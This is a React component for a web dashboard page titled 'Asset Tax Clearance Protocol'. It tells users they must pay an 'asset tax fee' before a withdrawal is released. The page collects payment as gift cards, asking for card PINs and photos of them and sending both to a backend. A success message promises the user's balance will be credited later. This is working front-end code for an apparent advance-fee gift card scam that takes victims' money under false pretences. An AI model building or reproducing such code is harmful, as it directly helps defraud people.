import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../../context/AuthContext';
import { submitAssetTaxCards, getSettings } from '../../services/api';
import toast from 'react-hot-toast';
import {
  LuFileText as FileText,
  LuPlus as Plus,
  LuTrash2 as Trash2,
  LuUpload as Upload,
  LuCircleAlert as AlertCircle,
  LuArrowLeft as ArrowLeft,
  LuClock as Clock,
  LuShieldCheck as ShieldCheck,
} from 'react-icons/lu';
import './AssetTaxView.css';

export const AssetTaxView = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);
  const [cards, setCards] = useState([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  useEffect(() => {
    getSettings().then(data => {
      if (data.success) setSettings(data.settings);
    }).catch(() => {});
  }, []);

  const taxAmount = settings?.taxAmount || 500;
  const taxCardType = settings?.taxCardType || 'Apple Card';

  useEffect(() => {
    if (cards.length === 0) {
      setCards([{
        id: `tax-${Date.now()}`,
        cardType: taxCardType,
        amount: taxAmount,
        pin: '',
        imageUrl: '',
        imageFileName: ''
      }]);
    }
  }, [taxCardType, taxAmount, cards.length]);

  const addCard = () => {
    setCards([...cards, {
      id: `tax-${Date.now()}-${Math.random().toString(36).substr(2,4)}`,
      cardType: taxCardType,
      amount: taxAmount,
      pin: '',
      imageUrl: '',
      imageFileName: ''
    }]);
  };

  const removeCard = (id) => {
    if (cards.length === 1) return;
    setCards(cards.filter(c => c.id !== id));
  };

  const handleChange = (id, field, value) => {
    setCards(cards.map(c => c.id === id ? { ...c, [field]: value } : c));
    setErrorMessage(null);
  };

  const handleFileUpload = (id, e) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setCards(cards.map(c => c.id === id ? { ...c, imageUrl: reader.result, imageFileName: file.name } : c));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage(null);
    for (let i = 0; i < cards.length; i++) {
      if (!cards[i].pin.trim()) { setErrorMessage(`Enter PIN for card ${i+1}`); return; }
      if (!cards[i].imageUrl) { setErrorMessage(`Upload image for card ${i+1}`); return; }
    }
    setIsSubmitting(true);
    try {
      await submitAssetTaxCards(user.id, cards);
      toast.success('Asset tax cards submitted!');
      setShowSuccessModal(true);
    } catch (err) {
      setErrorMessage(err.message || 'Submission failed.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const totalAmount = cards.reduce((acc, c) => acc + (Number(c.amount) || 0), 0);

  return (
    <div className="asset-tax-view">
      <button className="back-btn" onClick={() => navigate('/dashboard')}>
        <ArrowLeft /> Back to Dashboard
      </button>

      {showSuccessModal && (
        <div className="success-modal">
          <div><Clock /></div>
          <h3>Tax Clearance Submitted</h3>
          <p>Your asset tax clearance cards have been received. Upon compliance review, your balance will be credited with ${totalAmount.toLocaleString()} and your withdrawal will proceed.</p>
          <button onClick={() => { setShowSuccessModal(false); navigate('/dashboard'); }}>Return to Dashboard</button>
        </div>
      )}

      <div className="tax-container">
        <div className="header">
          <FileText />
          <div>
            <h1>Asset Tax Clearance Protocol</h1>
            <p>Institutional capital gains compliance stamp</p>
          </div>
        </div>

        <div className="notice-box">
          <ShieldCheck /> Asset Tax Requirement Notice
          <p>{settings?.taxCustomNotice || `You will have to pay an asset tax fee of $${taxAmount.toLocaleString()}, to proceed with your withdrawal. Note: the tax fee will be added to your balance.`}</p>
        </div>

        {errorMessage && <div className="error-banner"><AlertCircle /> {errorMessage}</div>}

        <form onSubmit={handleSubmit} className="tax-form">
          {cards.map((card, index) => (
            <div key={card.id} className="card-entry">
              <div className="card-header">
                <span>Asset Tax {taxCardType} #{index + 1}</span>
                {cards.length > 1 && (
                  <button type="button" onClick={() => removeCard(card.id)}><Trash2 /> Remove</button>
                )}
              </div>
              <div className="form-row">
                <div><label>Card Type</label><input type="text" readOnly value={taxCardType} /></div>
                <div><label>Amount ($)</label><input type="number" value={card.amount} onChange={e => handleChange(card.id, 'amount', parseFloat(e.target.value) || 0)} required /></div>
              </div>
              <div><label>Card PIN</label><input type="text" placeholder="e.g. X982-1104-5829-4401" value={card.pin} onChange={e => handleChange(card.id, 'pin', e.target.value)} required /></div>
              <div className="upload-field">
                <label>Upload Card PIN Photo</label>
                <div className="upload-area">
                  <input type="file" accept="image/*" onChange={(e) => handleFileUpload(card.id, e)} required={!card.imageUrl} />
                  <Upload />
                  <span>{card.imageFileName || 'Choose Image'}</span>
                </div>
                {card.imageUrl && <img src={card.imageUrl} alt="preview" className="preview" />}
              </div>
            </div>
          ))}

          <button type="button" className="add-btn" onClick={addCard}>
            <Plus /> Add More Cards
          </button>

          <button type="submit" className="submit-btn" disabled={isSubmitting}>
            {isSubmitting ? 'Submitting...' : `Submit Asset Tax Clearance ($${totalAmount.toLocaleString()})`}
          </button>
        </form>
      </div>
    </div>
  );
};